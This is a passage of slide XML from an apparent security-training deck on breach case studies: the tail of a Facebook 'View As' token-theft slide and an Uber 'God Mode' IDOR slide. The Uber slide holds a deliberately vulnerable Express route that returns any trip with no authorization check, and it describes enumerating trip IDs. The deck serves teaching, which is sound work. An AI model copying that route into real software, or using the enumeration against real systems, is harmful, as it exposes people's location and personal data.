                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  return token;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Text 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7437477" y="5219700"/>
            <a:ext cx="1481614" cy="185142"/>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Attack Impact</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="Text 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7437477" y="5449372"/>
            <a:ext cx="6621661" cy="665619"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Complete Account Access:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Stolen tokens provided full access to victim accounts including reading private messages, viewing friend lists, and accessing personal information</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Persistent Access:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Tokens remained valid until manually revoked, allowing extended unauthorized access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Third-Party Apps:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Tokens could be used with any Facebook-connected third-party application</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Profile Modifications:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Attackers could post content, change settings, and perform any action as the victim</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Data Harvesting:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Systematic extraction of personal data, photos, and relationship information</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="Text 53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7437477" y="6155115"/>
            <a:ext cx="6621661" cy="221694"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Response:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Facebook forced logout of 90 million users, disabled "View As" feature, notified affected users, and implemented comprehensive security reviews of interconnected features.</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05683" y="797600"/>
            <a:ext cx="5817870" cy="376238"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2950"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2350" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Uber God Mode IDOR Vulnerability (2016)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="705683" y="1306235"/>
            <a:ext cx="1393984" cy="184428"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 20892"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>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4383" y="1352550"/>
            <a:ext cx="91678" cy="91678"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="911900" y="1340525"/>
            <a:ext cx="1119068" cy="115848"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>INTERNAL TOOL BREACH</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="705683" y="1565196"/>
            <a:ext cx="13219033" cy="144661"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Company:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Uber | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Date:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> 2016 | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerability:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> IDOR in admin panel | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Impact:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Unrestricted access to all rider and driver data | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Discovery:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Security researcher | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Severity:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Critical - Complete location tracking and trip history exposure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="705683" y="1850588"/>
            <a:ext cx="1806059" cy="225743"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The Vulnerability</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="705683" y="2142530"/>
            <a:ext cx="5794653" cy="578644"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Uber's internal administrative tool, known as "God Mode" or "Heaven," contained a critical authorization flaw. While the tool required admin authentication to access, it performed no authorization checks on which specific trip data an admin could view. This allowed any admin-level user to access trip data for any rider or driver in the entire system.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="705683" y="2795707"/>
            <a:ext cx="5794653" cy="3499128"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1376"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="699968" y="2795707"/>
            <a:ext cx="5806083" cy="3499128"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 492"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="814626" y="2881670"/>
            <a:ext cx="5576768" cy="3327202"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Uber's internal admin tool - VULNERABLE</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app.get('/admin/trips/:tripId', </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authenticateAdmin, </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(req, res) =&gt; {</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const tripId = req.params.tripId;</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 CRITICAL FLAW: NO AUTHORIZATION CHECK</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 Any admin can access ANY trip</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db.query('SELECT * FROM trips WHERE id = ?', </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[tripId])</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.then(trip =&gt; {</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res.json({</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tripId: trip.id,</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riderId: trip.rider_id,</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driverId: trip.driver_id,</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pickupLocation: trip.pickup_location,</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dropoffLocation: trip.dropoff_location,</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fare: trip.fare,</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timestamp: trip.timestamp,</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routeData: trip.route_coordinates</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    });</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>});</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="705683" y="6369368"/>
            <a:ext cx="5794653" cy="289322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The vulnerability allowed sequential enumeration of trip IDs to extract complete trip histories, including precise GPS coordinates, timestamps, and personal identifiers for both riders and drivers.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6705124" y="1784390"/>
            <a:ext cx="7309723" cy="4933831"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1673"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD">
              <a:alpha val="95000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6819781" y="1850588"/>
            <a:ext cx="1806059" cy="225743"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Exploitation Process</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6819781" y="2150864"/>
            <a:ext cx="3507105" cy="788194"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6942058" y="2273141"/>
            <a:ext cx="1644491" cy="188119"/>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Admin Access Obtained</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6942058" y="2527459"/>
            <a:ext cx="3262551" cy="289322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Researcher exploited separate vulnerability to gain admin credentials and access internal admin panel</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
